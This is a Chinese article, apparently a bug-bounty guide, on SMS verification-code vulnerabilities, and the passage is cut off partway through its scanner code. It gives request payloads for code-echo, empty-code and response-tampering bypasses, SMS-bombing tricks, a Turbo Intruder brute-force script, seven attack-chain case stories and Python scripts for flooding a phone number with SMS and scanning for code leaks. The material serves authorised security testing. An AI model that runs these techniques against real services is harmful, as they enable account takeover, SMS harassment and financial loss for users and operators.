---
title: 一个六位数的验证码，我拿到了全站用户的明文密码
url: https://mp.weixin.qq.com/s/Jr0Tuhbt17VaR1Ji8EgZDw
source: Doonsec's feed
date: 2026-02-18
fetch_date: 2026-02-19T04:20:59.808207
---

# 一个六位数的验证码，我拿到了全站用户的明文密码

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/3oR6eMARh6zwuVZvPBBegYHkDg28ywxS7IibRIRMibPibqONohyHAxLtlwllNZhZnD9njQ5Qk7xfRHiaM4HM0KAOvBe1xGiaY4AbOPsDibzibJQUPA/0?wx_fmt=jpeg)

# 一个六位数的验证码，我拿到了全站用户的明文密码

原创

逍遥喝醉后写！
逍遥喝醉后写！

逍遥子讲安全

![]()

在小说阅读器中沉浸阅读

**一个六位数的验证码，决定了你是月入500还是月月5000。**

2024下半年年某头部SRC年度报告显示：**验证码相关漏洞占所有逻辑漏洞的37%**，但平均奖金只有800元——不是因为这个洞不值钱，而是90%的人只挖到了最浅的那层。

我见过最值钱的短信验证码漏洞，是一个“置空验证码”导致的**任意用户登录**，奖金**8000元**。也见过最亏的，一个“验证码回显”提交者只拿了500元——他不知道这个漏洞可以组合成**全站用户数据泄露**。

短信验证码是SRC里**出现频率极高、但价值方差极大**的漏洞类型。差距不在漏洞本身，在**你能走多深**。

本文将首次完整公开我的**短信验证码深度狩猎体系**——从6大类漏洞、12个实战案例到自动化武器库，全是干到拧不出水的干货。

## 第一章 验证码漏洞的“七宗罪”

### 1.1 验证码回显：开发者的“低级错误”

**本质**：服务器在返回“发送成功”的响应时，直接把验证码明文包含在返回包中。

**挖掘方法**：

* 点击“获取验证码”，用Burp抓取响应包
* 在JSON/XML响应中搜索`code`、`verifyCode`、`smsCode`、`vCode`等字段
* 重点关注登录、注册、密码找回接口

**案例**：某平台登录页抓包，响应包中直接返回：

```
{  "status": 200,  "message": "发送成功",  "code": "123456"}
```

攻击者可直接获取验证码登录任意账号。

**奖金参考**：500-2000元

### 1.2 短信轰炸：让厂商“破产”的漏洞

**原理**：服务器未对请求次数进行限制，导致可以无限重复发送短信。

**基础绕过思路**：

* 空格绕过：手机号后加空格
* 参数污染：手机号参数重复提交
* 大小写混淆：参数名大小写变异
* 多次叠加参数：如 `mobile=13800138000,13800138000`

**案例1：双写绕过**
某系统发送一次后提示“90秒内不可重复发送”。测试发现**双写手机号**可绕过：

text

```
mobile=13800138000,,13800138000
```

一次请求发送两条短信。

**案例2：参数遍历横向轰炸**
某系统有`smsType`参数，值为int类型。遍历发现多个值对应不同功能点的短信：

* smsType=1：登录验证码
* smsType=2：修改密码
* smsType=3：下单验证
* smsType=4：注册验证

虽然单个功能点有限制，但**组合使用可对同一手机号实现横向轰炸**。

**案例3：订单ID生成轰炸**
某下单支付功能：先下单生成订单ID，再用订单ID发送验证码。每个订单只能发5次。
攻击思路：**循环生成新订单ID，每个发5次**。10个订单=50次轰炸。

### 1.3 验证码爆破：四位数和六位数的差距

**原理**：4位或6位数字验证码，若服务端未限制错误次数和时间，可暴力破解。

**关键参数**：

* 4位验证码：0000-9999（1万种组合）
* 6位验证码：000000-999999（100万种组合）

**成功率关键**：

* 验证码有效期（通常4-6分钟）
* 单IP/单用户错误次数限制
* 验证码是否绑定手机号

**实战脚本思路**（使用Turbo Intruder高并发）：

```
def queueRequests(target, wordlists):    engine = RequestEngine(endpoint=target.endpoint,                           concurrentConnections=30,                           requestsPerConnection=100,                           pipeline=False)
    for code in range(0, 1000000):        code_str = str(code).zfill(6)        engine.queue(target.req, [code_str])def handleResponse(req, interesting):    if '成功' in req.response or req.status != 200:        table.add(req)
```

### 1.4 验证码绕过：逻辑缺陷的“骚操作”

#### 类型A：置空验证码

**案例**：某系统登录/注册共用接口`/sms/registerAndLogin`。正常请求：

```
{  "username": "13800138000",  "code": "123456",  "tenantId": "xxx"}
```

测试发现：**将code字段置空，同样返回token**。直接绕过验证码，任意手机号可注册/登录。

进一步测试：已注册账号在登录口同样置空验证码，也返回token。**任意用户登录**，高危漏洞。

#### 类型B：图形验证码复用（虽不是短信，常组合出现）

**案例**：某系统登录口有图形验证码。抓包发现`verifyId`字段绑定验证码值。**删除该字段**后，验证码校验失效。

**另一种情况**：验证码不绑定session，**一个验证码可重复使用**，重放登录包10次均成功。

### 1.5 验证码与订单ID绑定绕过

**场景**：支付、下单等敏感操作需短信验证，验证码绑定订单ID。

**挖掘思路**：

1. A账号下单，获取订单ID1
2. B账号下单，获取订单ID2
3. 尝试用A的验证码操作B的订单

**实战案例**：某电商平台，验证码只校验是否正确，**未校验与订单ID的从属关系**。导致攻击者可以用自己的验证码确认他人的订单，实现**越权支付**。

### 1.6 响应包篡改绕过

**场景**：前端根据后端返回的`status`或`code`判断验证码是否正确。

**挖掘方法**：

1. 输入错误验证码，拦截响应包
2. 将`"code": 400`改为`"code": 200`
3. 放包，观察是否绕过

**进阶技巧**：返回包中直接包含token，可替换为其他用户的token实现登录。

### 1.7 验证码复用（多阶段校验）

**场景**：一个验证码可用于多个操作（如注册和登录），且不失效。

**挖掘方法**：

1. 注册时获取验证码`123456`
2. 登录其他账号时，使用同一个验证码`123456`
3. 若成功，则存在复用漏洞

## 第二章 实战案例库（完整攻击链）

### 【案例1】置空验证码 → 任意用户登录 → 后台接管

**目标**：某金融平台APP
**耗时**：45分钟
**奖金**：8000元

**攻击路径**：

1. 登录接口抓包：`POST /api/login` 参数为 `mobile` 和 `code`
2. 尝试删除`code`参数，请求体为空 → 返回错误
3. 尝试`code`参数置空：`"code": ""` → 返回token，登录成功！
4. 验证：用任意手机号均可登录，包括已注册和未注册的
5. 登录后调用`/api/user/info`，获取用户敏感信息（姓名、身份证）
6. 进一步：通过修改密码接口，重置任意账号密码

**漏洞组合**：置空验证码 + 任意用户登录 + 越权修改密码

**厂商修复**：紧急下线接口，24小时内发布新版本

### 【案例2】短信轰炸+参数遍历+订单ID循环

**目标**：某电商平台
**耗时**：1.5小时
**奖金**：3500元

**攻击路径**：

1. 密码找回功能抓包：`POST /forget/sendCode`，参数`mobile`和`smsType=2`
2. 测试单手机号限制：发送3次后提示频繁
3. 遍历`smsType`参数（1-20），发现`smsType=1,2,3,5,7,11`均返回成功
4. **组合利用**：一次请求可发6条短信
5. 同时发现订单支付时验证码也走同一接口，订单ID可遍历
6. 编写脚本循环生成订单ID，每个订单可发5次验证码
7. 结果：**10分钟内对单手机号发送200+条短信**

**漏洞价值**：短信轰炸导致厂商短信费用损失（每条0.05元，200条=10元），看似不大，但攻击者可无限消耗，且可针对所有手机号

### 【案例3】验证码回显+信息泄露+密码重置

**目标**：某政务系统
**耗时**：20分钟
**奖金**：1500元

**攻击路径**：

1. 注册页面抓包，点击获取验证码
2. 响应包中直接包含：

```
json{  "success": true,  "verificationCode": "285731"}
```

3. 直接输入验证码，注册成功
4. 进一步测试：密码找回接口同样回显验证码
5. 输入任意手机号，获取其验证码，重置密码成功
6. 登录该账号，查看用户信息（含身份证、住址）

**漏洞组合**：验证码回显 + 密码重置

### 【案例4】验证码爆破+IDOR批量拖库

**目标**：某大学教务系统
**耗时**：2小时
**奖金**：4000元

**攻击路径**：

1. 登录接口验证码为4位数字（0000-9999）
2. 测试发现：**无错误次数限制，验证码有效期30分钟**
3. 编写Turbo Intruder脚本，40线程爆破
4. 45分钟后爆破成功，验证码为`3728`
5. 同时发现用户ID为连续数字（10000-20000）
6. 登录后调用`/api/student/info?id=10001`，可查看其他学生信息
7. **组合利用**：爆破任意账号验证码，遍历ID获取全站学生信息

### 【案例5】订单ID绑定缺陷+越权支付

**目标**：某外卖平台
**耗时**：3小时
**奖金**：6000元

**攻击路径**：

1. 下单时需短信确认，验证码绑定订单ID
2. A账号下单，获取验证码`123456`
3. 拦截确认请求，将订单ID改为B账号的订单
4. 请求成功，A的验证码确认了B的订单
5. 导致：**攻击者可帮他人确认订单**（或强制他人订单）
6. 进一步测试：支付接口同样缺陷，可**用自己验证码支付他人订单**
7. 尝试支付订单后，余额扣减成功，但订单属于他人
8. 最终可造成**任意用户资金损失**

### 【案例6】图形验证码复用+密码爆破

**目标**：某VPN登录系统
**耗时**：1.5小时
**奖金**：3000元

**攻击路径**：

1. 登录口有图形验证码，每次刷新变化
2. 抓包发现验证码与`verifyId`绑定
3. 测试发现：**删除verifyId参数后，验证码校验失效**
4. 用Burp Intruder对密码进行爆破
5. 成功爆破管理员弱口令`admin/123456`
6. 登录后台，可导出所有VPN用户配置

### 【案例7】验证码复用+多阶段绕过

**目标**：某社交APP
**耗时**：1小时
**奖金**：2000元

**攻击路径**：

1. 注册接口：获取验证码`123456`，用该验证码注册成功
2. 不退出，用同一手机号登录另一设备
3. 登录接口输入同样的验证码`123456`，成功登录
4. 验证码未失效，可重复使用
5. 导致：**攻击者截获一次验证码，即可永久登录该账号**

## 第三章 自动化武器库

### 3.1 短信轰炸检测脚本

```
python# sms_bomb_detector.pyimport requestsimport threadingimport timeclass SMSBombTester:    def __init__(self, url, phone_param, phone):        self.url = url        self.phone_param = phone_param        self.phone = phone        self.headers = {"User-Agent": "Mozilla/5.0"}
    def test_normal(self):        """正常发送一次"""        data = {self.phone_param: self.phone}        r = requests.post(self.url, data=data, headers=self.headers)        return r.status_code
    def test_duplicate(self, count=10):        """重复发送测试"""        success = 0        for i in range(count):            data = {self.phone_param: self.phone}            r = requests.post(self.url, data=data, headers=self.headers)            if r.status_code == 200:                success += 1            time.sleep(0.5)        return success
    def test_comma_bypass(self):        """逗号分隔绕过"""        phones = ",".join([self.phone] * 5)        data = {self.phone_param: phones}        r = requests.post(self.url, data=data, headers=self.headers)        return r.text
    def test_parameter_pollution(self):        """参数污染"""        data = {            self.phone_param: self.phone,            self.phone_param + " ": self.phone,            self.phone_param.upper(): self.phone        }        r = requests.post(self.url, data=data, headers=self.headers)        return r.text# 使用示例tester = SMSBombTester("https://target.com/sendSMS", "mobile", "13800138000")print(f"正常发送: {tester.test_normal()}")print(f"重复10次成功数: {tester.test_duplicate(10)}")print(f"逗号绕过结果: {tester.test_comma_bypass()}")
```

### 3.2 验证码回显扫描器

```
python# code_leak_scanner.pyimport requestsimport jsonimport refrom concurrent.futures import ThreadPoolExecutordef scan_code_leak(url, phone):    """扫描验证码回显漏洞"""    payloads = [        {"mobile": phone},        {"phone": phone},        {"username": phone},        {"tel": phone}    ]
    sensitive_fields = ["code", "verifyCode", "smsCode", "vCode", "verificationCode", "checkCode"]
    for data in payloads:        try:            r = requests.post(url, json=data, timeout=5)            if r.status_code == 200:                text = r.text                for field in sensitive_fields:                    # 尝试多种匹配模式                    pattern = f'"{field}"\\s*:\\s*"(\\d{{4,6}})"'                    match = re.search(pattern, text, re.IGNORECASE)                    if match:                        code = match.group(1)                        print(f"[+] 发现验证码回显: {field}={code}")                        print(f"    请求: {data}")                        print(f"    响应: {text[:200]}")                        return True        except:            pass    return False# 批量扫描urls = ["https://target.com/api/sendSMS", "https://target.com/api/forgotPassword"]with ThreadPoolExecutor(max_workers...